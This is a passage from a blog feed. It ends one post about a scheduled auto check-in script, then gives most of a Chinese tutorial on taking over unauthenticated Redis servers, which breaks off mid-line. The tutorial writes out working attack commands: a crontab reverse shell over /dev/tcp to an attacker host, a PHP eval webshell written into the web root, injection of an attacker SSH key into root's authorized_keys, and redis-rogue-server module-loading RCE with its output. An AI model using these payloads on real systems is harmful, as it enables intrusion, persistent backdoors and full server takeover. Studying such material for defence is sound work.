title="识别效果"></a>识别效果</h2><p><strong>这种简单的验证码准确度还是很不错的：</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210122182317.png" alt="image-20210122182317193"></p><h1 id="Server-酱"><a href="#Server-酱" class="headerlink" title="Server 酱"></a>Server 酱</h1><p><strong>Python3 测试脚本：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;&quot;</span> <span class="comment"># Server 酱的SCKEY</span></span><br><span class="line">url = <span class="string">&quot;https://sc.ftqq.com/%s.send&quot;</span>%(key)</span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&#x27;</span>&#125;</span><br><span class="line">payload = &#123;<span class="string">&#x27;text&#x27;</span>: <span class="string">&#x27;Server 酱提醒&#x27;</span>, <span class="string">&#x27;desp&#x27;</span>: <span class="string">&#x27;Python 用 Server 酱推送微信模板消息&#x27;</span>&#125;</span><br><span class="line">requests.post(url, params=payload, headers=headers)</span><br></pre></td></tr></table></figure><p><strong>复制SCKEY：</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210122235416.png" alt="image-20210122235416805"></p><h1 id="自动签到脚本"><a href="#自动签到脚本" class="headerlink" title="自动签到脚本"></a>自动签到脚本</h1><p><strong>脚本改自：</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210122202435.png" alt="image-20210122202435193"></p><p><strong>添加了 Server 酱微信通知功能 方便每天接收通知</strong></p><p><strong>下载地址：<a href="https://github.com/lintstar/Zero-AutoCheck/releases">https://github.com/lintstar/Zero-AutoCheck/releases</a></strong></p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p><strong>在 ① ② 处填入 <a href="http://www.ttshitu.com/">图鉴</a> 的账号密码 ③ 处填入 <a href="http://sc.ftqq.com/?c=code">Server 酱</a> 的 SCKEY</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210122203901.png" alt="image-20210122203901971"></p><p><strong>④ ⑤ 处分别填入 <a href="https://wiki.0-sec.org/#/login">零组文库</a> 的账号密码</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210122204419.png" alt="image-20210122204419293"></p><h1 id="脚本效果"><a href="#脚本效果" class="headerlink" title="脚本效果"></a>脚本效果</h1><p><strong>通知效果</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210122204759.png" alt="image-20210122204759618"></p><h2 id="签到失败通知"><a href="#签到失败通知" class="headerlink" title="签到失败通知"></a>签到失败通知</h2><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210122204838.png" alt="image-20210122204838079"></p><h2 id="签到成功效果"><a href="#签到成功效果" class="headerlink" title="签到成功效果"></a>签到成功效果</h2><p><strong>每日首次签到通知</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210123001123.png" alt="image-20210123001123289"></p><p><strong>重复签到通知</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210122204857.png" alt="image-20210122204857759"></p><h1 id="VPS-Crontab"><a href="#VPS-Crontab" class="headerlink" title="VPS Crontab"></a>VPS Crontab</h1><ol><li><p><strong>新建文件夹</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir Auto</span><br><span class="line"><span class="built_in">cd</span> Auto</span><br></pre></td></tr></table></figure></li><li><p><strong>下载脚本</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/lintstar/Zero-AutoCheck/releases/download/1.0/Zero-AutoCheck.py</span><br></pre></td></tr></table></figure></li><li><p><strong>替换自己的账号密码和 SCKEY</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim Zero-AutoCheck.py</span><br></pre></td></tr></table></figure></li><li><p><strong>安装 Python3.6</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install python36</span><br></pre></td></tr></table></figure></li><li><p><strong>添加定时任务</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -e</span><br></pre></td></tr></table></figure></li><li><p><strong>新增 每天9点20执行脚本</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">20 9 * * * /usr/bin/python3 /root/Auto/Zero-AutoCheck.py</span><br></pre></td></tr></table></figure></li><li><p><strong>保存退出</strong></p></li></ol><h1 id="运行效果"><a href="#运行效果" class="headerlink" title="运行效果"></a>运行效果</h1><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210124120619.png" alt="image-20210124120619040"></p><h2 id="每天-3-积分"><a href="#每天-3-积分" class="headerlink" title="每天 3 积分 ~"></a>每天 3 积分 ~</h2><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210124120643.png" alt="image-20210124120643281"></p><blockquote><p>测试时候出现了几次签到成功却没有通知到微信的情况，是因为方糖近期服务器稳定性的问题：</p></blockquote><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210124120920.png" alt="image-20210124120920691"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;零组资料文库 3.0 设置了信誉积分机制：&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;信誉</summary>
      
    
    
    
    <category term="Fun" scheme="https://www.lintstar.top/categories/Fun/"/>
    
    
    <category term="Python" scheme="https://www.lintstar.top/tags/Python/"/>
    
    <category term="ServerChan" scheme="https://www.lintstar.top/tags/ServerChan/"/>
    
    <category term="Crontab" scheme="https://www.lintstar.top/tags/Crontab/"/>
    
  </entry>
  
  <entry>
    <title>Redis GetShell 姿势总结</title>
    <link href="https://www.lintstar.top/2021/01/d0e169c6.html"/>
    <id>https://www.lintstar.top/2021/01/d0e169c6.html</id>
    <published>2021-01-02T14:22:22.000Z</published>
    <updated>2021-02-01T06:29:12.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Crontab-计划任务"><a href="#Crontab-计划任务" class="headerlink" title="Crontab 计划任务"></a>Crontab 计划任务</h1><p>Crontab 是 Linux系统或 Unix 系统中常用的定时命令,使用 Crontab 可以在指定的时间执行一个 Shell 脚本或者一系列 Linux/Unix 命令。</p><h2 id="Crontab-格式"><a href="#Crontab-格式" class="headerlink" title="Crontab 格式"></a>Crontab 格式</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">*    *    *    *    *    <span class="built_in">command</span></span><br><span class="line">-    -    -    -    -    -</span><br><span class="line">|    |    |    |    |    |</span><br><span class="line">|    |    |    |    |    +----- 需要执行的命令（绝对路径）</span><br><span class="line">|    |    |    |    +---------- 星期中星期几 (0 - 7) (星期天 为0)</span><br><span class="line">|    |    |    +--------------- 月份 (1 - 12) </span><br><span class="line">|    |    +-------------------- 一个月中的第几天 (1 - 31)</span><br><span class="line">|    +------------------------- 小时 (0 - 23)</span><br><span class="line">+------------------------------ 分钟 (0 - 59)</span><br></pre></td></tr></table></figure><h2 id="Crontab-示例"><a href="#Crontab-示例" class="headerlink" title="Crontab 示例"></a>Crontab 示例</h2><ol><li>在每天凌晨过一分钟12:01 a.m 执行</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 0 * * * /root/bin/backup.sh</span><br></pre></td></tr></table></figure><ol start="2"><li>每个工作日(Mon – Fri) 11:59 p.m 执行</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">59 11 * * 1,2,3,4,5 /root/bin/backup.sh</span><br></pre></td></tr></table></figure><p>下面例子与上面的例子效果一样：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">59 11 * * 1-5 /root/bin/backup.sh</span><br></pre></td></tr></table></figure><ol start="3"><li>每5分钟执行一次命令</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/5 * * * * /root/bin/check-status.sh</span><br></pre></td></tr></table></figure><ol start="4"><li>每个月的第一天 1:10 p.m 执行</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10 13 1 * * /root/bin/full-backup.sh</span><br></pre></td></tr></table></figure><ol start="5"><li>每个工作日 11 p.m 执行</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 23 * * 1-5 /root/bin/incremental-backup.sh</span><br></pre></td></tr></table></figure><h2 id="Crontab-选项"><a href="#Crontab-选项" class="headerlink" title="Crontab 选项"></a>Crontab 选项</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">crontab –e :  修改 crontab 文件. 如果文件不存在会自动创建。 </span><br><span class="line">crontab –l :  显示 crontab 文件。 </span><br><span class="line">crontab -r :  删除 crontab 文件。</span><br><span class="line">crontab -ir : 删除 crontab 文件前提醒用户。</span><br></pre></td></tr></table></figure><h2 id="Cron表达式和Crontab的区别"><a href="#Cron表达式和Crontab的区别" class="headerlink" title="Cron表达式和Crontab的区别"></a>Cron表达式和Crontab的区别</h2><ul><li><p>Cron表达式从左往右，从秒开始；而Crontab则是从分钟开始的。</p></li><li><p>Cron表达式是一个字符串，字符串以5或6个空格隔开，分为6或7个域，每一个域代表一个含义，</p></li><li><p>Cron有如下两种语法格：</p><p>（1）Seconds   Minutes   Hours   DayofMonth   Month   DayofWeek   Year</p><p>（2）Seconds   Minutes   Hours   DayofMonth   Month   DayofWeek </p></li><li><p>Crontab格式：</p><p>MIN（分钟） HOUR（小时） DAY（日期） MONTH（月份） DAYOFWEEK（星期） COMMAND（命令） </p></li></ul><hr><h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><ol><li><strong>redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源 ip 访问等相关安全策略，直接暴露在公网</strong></li><li><strong>没有设置密码认证（一般为空），可以免密码远程登录redis服务</strong></li></ol><hr><h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><p><strong>目标机器：172.16.186.4</strong></p><h2 id="Kali-开启-SSH"><a href="#Kali-开启-SSH" class="headerlink" title="Kali 开启 SSH"></a>Kali 开启 SSH</h2><h4 id="1-查看ssh服务状态"><a href="#1-查看ssh服务状态" class="headerlink" title="1. 查看ssh服务状态"></a>1. 查看ssh服务状态</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/ssh status</span><br></pre></td></tr></table></figure><h4 id="2-修改配置文件"><a href="#2-修改配置文件" class="headerlink" title="2.修改配置文件"></a>2.修改配置文件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201222103844.png" alt="20201222_1007"></p><h4 id="3-启动ssh服务"><a href="#3-启动ssh服务" class="headerlink" title="3. 启动ssh服务"></a>3. 启动ssh服务</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/ssh start</span><br></pre></td></tr></table></figure><p>查看服务状态</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/ssh status</span><br></pre></td></tr></table></figure><p>开机启动</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update-rc.d ssh <span class="built_in">enable</span></span><br></pre></td></tr></table></figure><h2 id="配置-Redis"><a href="#配置-Redis" class="headerlink" title="配置 Redis"></a>配置 Redis</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">wget http://download.redis.io/releases/redis-3.2.11.tar.gz </span><br><span class="line">tar zxvf redis-3.2.11.tar.gz </span><br><span class="line"><span class="built_in">cd</span> redis-3.2.11</span><br><span class="line">cp redis.conf /etc/redis.conf</span><br><span class="line">make</span><br><span class="line"><span class="built_in">cd</span> src</span><br><span class="line">cp redis-server /usr/bin/</span><br><span class="line">cp redis-cli /usr/bin/</span><br><span class="line">vim /etc/redis.conf</span><br></pre></td></tr></table></figure><blockquote><p>去掉ip绑定，允许除本地外的主机远程登录redis服务 前面加#注释掉</p><p>关闭保护模式，允许远程连接redis服务将yes 改为no</p></blockquote><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201222110807.png" alt="20201222_1107"></p><h2 id="启动-Redis"><a href="#启动-Redis" class="headerlink" title="启动 Redis"></a>启动 Redis</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-server /etc/redis.conf</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201222111048.png" alt="image-20201222111048640"></p><hr><h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><p><strong>连接 Redis 服务器</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 172.16.186.4</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> （1）info                       查看信息     </span><br><span class="line"> （2）flushall                 删除所有数据库内容</span><br><span class="line"> （3）flushdb                    刷新数据库</span><br><span class="line"> （4）KEYS * 查看所有键，使用select num可以查看键值数据。</span><br><span class="line"> （5）<span class="built_in">set</span> <span class="built_in">test</span> <span class="string">&quot;who am i&quot;</span>        设置变量</span><br><span class="line"> （6）config <span class="built_in">set</span> dir &#123;dirpath&#125;     设置路径等配置</span><br><span class="line"> （7）config <span class="built_in">set</span> dbfilename redis.rdb 设置备份文件名</span><br><span class="line"> （8）config get dir/dbfilename  获取路径及数据配置信息</span><br><span class="line"> （9）save                       保存</span><br><span class="line">（10）get                        变量，查看变量名称</span><br></pre></td></tr></table></figure><p><strong>MSF 下利用模块</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/redis/file_upload </span><br><span class="line">auxiliary/scanner/redis/redis_login</span><br><span class="line">auxiliary/scanner/redis/redis_server</span><br></pre></td></tr></table></figure><p><strong>nmap获取信息</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p 6379 --script redis-info 172.16.186.4</span><br></pre></td></tr></table></figure><blockquote><p>GetShell 原理：攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的 config 命令，可以进行写文件操作，我们可以将dir 设置为一个目录 a，而 dbfilename 为文件名 b，再执行 save 或 bgsave，就可以写入一个路径为 a/b 的任意文件。</p></blockquote><hr><h1 id="计划任务反弹-Shell"><a href="#计划任务反弹-Shell" class="headerlink" title="计划任务反弹 Shell"></a>计划任务反弹 Shell</h1><ul><li><strong>在 Redis 以 root 权限运行时可以写 crontab 来执行命令反弹 shell</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># VPS 启监听</span></span><br><span class="line">➜ nc -lvp 6666</span><br><span class="line"></span><br><span class="line"><span class="comment"># 攻击机连接 Redis (若其他端口加 -p)</span></span><br><span class="line">➜ redis-cli -h 172.16.186.4</span><br><span class="line"></span><br><span class="line">172.16.186.4:6379&gt; <span class="built_in">set</span> x <span class="string">&quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xx/port 0&gt;&amp;1\n&quot;</span></span><br><span class="line">OK</span><br><span class="line">172.16.186.4:6379&gt; config <span class="built_in">set</span> dir /var/spool/cron/</span><br><span class="line">OK</span><br><span class="line">172.16.186.4:6379&gt; config <span class="built_in">set</span> dbfilename root</span><br><span class="line">OK</span><br><span class="line">172.16.186.4:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><blockquote><p>Tips：默认编写的crontab文件会保存在 (/var/spool/cron/用户名 例如: /var/spool/cron/root </p><p>crontab -l  列出某个用户cron服务的详细内容</p><p>crontab -r  删除每个用户cront任务 (谨慎：删除所有的计划任务) </p><p>crontab -e  使用编辑器编辑当前的crontab文件 </p><p>如：*/1 * * * * echo “hello world” &gt;&gt; /tmp/test.txt 每分钟写入文件</p></blockquote><hr><h1 id="Web-目录写-Shell"><a href="#Web-目录写-Shell" class="headerlink" title="Web 目录写 Shell"></a>Web 目录写 Shell</h1><ol><li><strong>当 redis 权限不高且服务器开着 web 服务</strong></li><li><strong>redis 有 web 目录写权限</strong></li><li><strong>可以尝试往 web 路径写 webshell</strong></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 攻击机连接 Redis (若其他端口加 -p)</span></span><br><span class="line">➜ redis-cli -h 172.16.186.4</span><br><span class="line"></span><br><span class="line">172.16.186.4:6379&gt; config <span class="built_in">set</span> dir /var/www/html/</span><br><span class="line">OK</span><br><span class="line">172.16.186.4:6379&gt; config <span class="built_in">set</span> dbfilename shell.php</span><br><span class="line">OK</span><br><span class="line">172.16.186.4:6379&gt; <span class="built_in">set</span> x <span class="string">&quot;&lt;?php @eval(<span class="variable">$_POST</span>[&#x27;shell&#x27;]);?&gt;&quot;</span></span><br><span class="line">OK</span><br><span class="line">172.16.186.4:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><hr><h1 id="写-ssh-keygen-公钥获取权限"><a href="#写-ssh-keygen-公钥获取权限" class="headerlink" title="写 ssh-keygen 公钥获取权限"></a>写 ssh-keygen 公钥获取权限</h1><ol><li><strong>Redis服务使用ROOT账号启动</strong></li><li><strong>服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。</strong></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 本地生成一对密钥</span></span><br><span class="line">➜ ssh-keygen -t rsa</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将公钥写入一个文件，内容前后要加两个换行</span></span><br><span class="line">(<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>; cat /root/.ssh/id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>) &gt; key.txt</span><br><span class="line"><span class="comment"># 将公钥放入目标服务器键`crackit`里面</span></span><br><span class="line">cat key.txt | redis-cli -h 172.16.186.4 -x <span class="built_in">set</span> crackit</span><br><span class="line"></span><br><span class="line">172.16.186.4:6379&gt; config <span class="built_in">set</span> dir /root/.ssh/</span><br><span class="line">OK</span><br><span class="line">172.16.186.4:6379&gt; config get dir</span><br><span class="line">1) <span class="string">&quot;dir&quot;</span></span><br><span class="line">2) <span class="string">&quot;/root/.ssh&quot;</span></span><br><span class="line">172.16.186.4:6379&gt; config <span class="built_in">set</span> dbfilename authorized_keys</span><br><span class="line">OK</span><br><span class="line">172.16.186.4:6379&gt; save</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用私钥连接</span></span><br><span class="line">➜ ssh -i id_rsa root@172.16.186.4</span><br></pre></td></tr></table></figure><blockquote><p>或者172.16.186.4:6379&gt; set crackit “\n\n\n 公钥内容 \n\n\n”</p></blockquote><hr><h1 id="Redis-主从复制-GetShell"><a href="#Redis-主从复制-GetShell" class="headerlink" title="Redis 主从复制 GetShell"></a>Redis 主从复制 GetShell</h1><p><strong>Redis 是一个使用 ANSIC 编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个 Redis 的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis 就提供了主从模式，主从模式就是指使用一个 redis 实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。基于Redis主从复制的机制，可以通过FULLRESYNC将任意文件同步到从节点（slave）从而利用漏洞获取权限。</strong></p><h2 id="Redis-RCE-自动化工具"><a href="#Redis-RCE-自动化工具" class="headerlink" title="Redis RCE 自动化工具"></a>Redis RCE 自动化工具</h2><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><p><strong>Redis &lt;=5.0.5</strong></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p><strong><a href="https://github.com/n0b0dyCN/redis-rogue-server">Redis Rogue Server</a></strong></p><h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-h, --<span class="built_in">help</span>           show this <span class="built_in">help</span> message and <span class="built_in">exit</span></span><br><span class="line">--rhost=REMOTE_HOST  target host</span><br><span class="line">--rport=REMOTE_PORT  target redis port, default 6379</span><br><span class="line">--lhost=LOCAL_HOST   rogue server ip</span><br><span class="line">--lport=LOCAL_PORT   rogue server listen port, default 21000</span><br><span class="line">--exp=EXP_FILE       Redis Module to load, default exp.so</span><br><span class="line">-v, --verbose        Show full data stream</span><br></pre></td></tr></table></figure><h3 id="交互式-Shell"><a href="#交互式-Shell" class="headerlink" title="交互式 Shell"></a>交互式 Shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">➜ python3 redis-rogue-server.py --rhost=目标 IP --lhost=xx.xx.xx.xx</span><br><span class="line">______         _ _      ______                         _____                          </span><br><span class="line">| ___ \       | (_)     | ___ \                       /  ___|                         </span><br><span class="line">| |_/ /___  __| |_ ___  | |_/ /___   __ _ _   _  ___  \ `--.  ___ _ ____   _____ _ __ </span><br><span class="line">|    // _ \/ _` | / __| |    // _ \ / _` | | | |/ _ \  `--. \/ _ \ <span class="string">&#x27;__\ \ / / _ \ &#x27;</span>__|</span><br><span class="line">| |\ \  __/ (_| | \__ \ | |\ \ (_) | (_| | |_| |  __/ /\__/ /  __/ |   \ V /  __/ |   </span><br><span class="line">\_| \_\___|\__,_|_|___/ \_| \_\___/ \__, |\__,_|\___| \____/ \___|_|    \_/ \___|_|   </span><br><span class="line">                                     __/ |                                            </span><br><span class="line">                                    |___/                                             </span><br><span class="line">@copyright n0b0dy @ r3kapig</span><br><span class="line"></span><br><span class="line">[info] TARGET 127.0.0.1:6379</span><br><span class="line">[info] SERVER 127.0.0.1:21000</span><br><span class="line">[info] Setting master...</span><br><span class="line">[info] Setting dbfilename...</span><br><span class="line">[info] Loading module...</span><br><span class="line">[info] Temerory cleaning up...</span><br><span class="line">What <span class="keyword">do</span> u want, [i]nteractive shell or [r]everse shell: i</span><br><span class="line">[info] Interact mode start, enter <span class="string">&quot;exit&quot;</span> to quit.</span><br><span class="line">[&lt;&lt;] whoami</span><br><span class="line">[&gt;&gt;] :n0b0dy</span><br><span class="line">[&lt;&lt;] </span><br></pre></td></tr></table></figure><h3 id="反弹-Shell"><a href="#反弹-Shell" class="headerlink" title="反弹 Shell"></a>反弹 Shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">➜ python3 redis-rogue-server.py --rhost=目标 IP --lhost=xx.xx.xx.xx</span><br><span class="line">______         _ _      ______                         _____</span><br><span class="line">| ___ \       | (_)     | ___ \                       /  ___|</span><br><span class="line">| |_/ /___  __| |_ ___  | |_/ /___   __ _ _   _  ___  \ `--.  ___ _ ____   _____ _ __</span><br><span class="line">|    // _ \/ _` | / __| |    // _ \ / _` | | | |/ _ \  `--. \/ _ \ <span class="string">&#x27;__\ \ / / _ \ &#x27;</span>__|</span><br><span class="line">| |\ \  __/ (_| | \__ \ | |\ \ (_) | (_| | |_| |  __/ /\__/ /  __/ |   \ V /  __/ |</span><br><span class="line">\_| \_\___|\__,_|_|___/ \_| \_\___/ \__, |\__,_|\___| \____/ \___|_|    \_/ \___|_|</span><br><span class="line">                                     __/ |</span><br><span class="line">                                    |___/</span><br><span class="line">@copyright n0b0dy @ r3kapig</span><br><span class="line"></span><br><span class="line">[info] TARGET 127.0.0.1:6379</span><br><span class="line">[info] SERVER 127.0.0.1:21000</span><br><span class="line">[info] Setting master...</span><br><span class="line">[info] Setting dbfilename...</span><br><span class="line">[info] Loading module...</span><br><span class="line">[info] Temerory cleaning up...</span><br><span class="line">What <span class="keyword">do</span> u want, [i]nteractive shell or [r]everse shell: r</span><br><span class="line">[info] Open reverse shell...</span><br><span class="line">Reverse server address: 127.0.0.1</span><br><span class="line">Reverse server port: 9999</span><br><span class="line">[info] Reverse shell payload sent.</span><br><span class="line">[info] Check at 127.0.0.1:9999</span><br><span class="line">[info] Unload module...</span><br></pre></td></tr></table></figure><p><strong>VPS 接收 Shell：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜ nc -lvvp 9999</span><br><span class="line">Listening on [0.0.0.0] (family 0, port 9999)</span><br><span class="line">Connection from localhost.localdomain 39312 received!</span><br><span 